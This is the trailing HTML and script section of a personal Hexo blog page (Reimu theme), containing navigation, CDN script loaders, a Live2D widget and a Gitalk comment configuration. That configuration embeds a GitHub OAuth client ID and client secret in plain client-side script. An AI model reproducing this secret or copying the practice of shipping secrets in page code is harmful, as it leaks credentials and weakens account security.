      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">首页</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">归档</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">关于</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
      <div class="sidebar-menu-icon icon-taichi"></div>
      <div class="sidebar-menu-link">友链</div>
    </div>
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
      <div class="site-search">
        <div class="reimu-popup popup">
          <div class="reimu-search">
            <div class="reimu-search-input-icon"></div>
            <div class="reimu-search-input" id="reimu-search-input"></div>
            <div class="popup-btn-close"></div>
          </div>
          <div class="reimu-results">
            <div id="reimu-stats"></div>
            <div id="reimu-hits"></div>
            <div id="reimu-pagination" class="reimu-pagination"></div>
          </div>
          <img class="reimu-bg" src="/images/reimu.png"/>
        </div>
      </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>


<script type="module" data-pjax>
  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
  
  const pswp = () => {
    if (_$$('.article-entry a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-entry',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
      new PhotoSwipeLightbox({
        gallery: '.article-gallery',
        children: 'a.article-gallery-item',
        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
      }).init();
    }
    window.lightboxStatus = 'done';
    window.removeEventListener('lightbox:ready', pswp);
  }
  if(window.lightboxStatus === 'ready') {
    pswp()
  } else {
    window.addEventListener('lightbox:ready', pswp);
  }
</script>






  
<script src="https://npm.webcache.cn/gitalk/dist/gitalk.min.js" data-pjax></script>

  
  <script data-pjax>
    var gitalkId = location.pathname;
    var gitalk = new Gitalk({
      clientID: '0efb4a442bc09d1ba17e',
      clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
      repo: 'https://github.com/Yyjccc/yyjccc.github.io.git',
      owner: 'Yyjccc',
      admin: "Yyjccc",
      id: gitalkId, // Ensure uniqueness and length less than 50
      distractionFreeMode: false // Facebook-like distraction free mode
    })
    if (document.getElementById('comments')) {
      gitalk.render('comments')
    }
  </script>







  
<script src="/js/generator_search.js" defer></script>






  
<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>

  <script>
    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>





  <script>
    function initLive2d() {
      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
    }
  </script>
  
<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>




  
<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>

  <script data-pjax>
    quicklink.listen({
      timeout: 3000,
      priority: true,
      ignores: []
    });
  </script>


<div id="lazy-script">
  <div>
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '0.3.0-alpha.1' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  

<script data-pjax>
  var updateTime = _$('#post-update-time')?.innerHTML;

  if (updateTime) {
    const update = new Date(updateTime);
    const now = new Date();
    const diff = now - update;
    const days = diff / 86400000;
    const { daysAgo, message: template } = window.outdate;
    if (days >= daysAgo) {
      const message = template.replace(/{time}/, updateTime);
      const blockquote = _$('#outdate-blockquote');
      if (blockquote) {
        blockquote.querySelector('p').innerText = message;
        blockquote.style.display = 'block';
      }
    }
  }
</script>


  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>

  <!-- hexo injector body_end start -->
<script src="/js/insert_highlight.js" data-pjax></script>
<!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true,"react":{"opacity":0.7}}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
  </html>

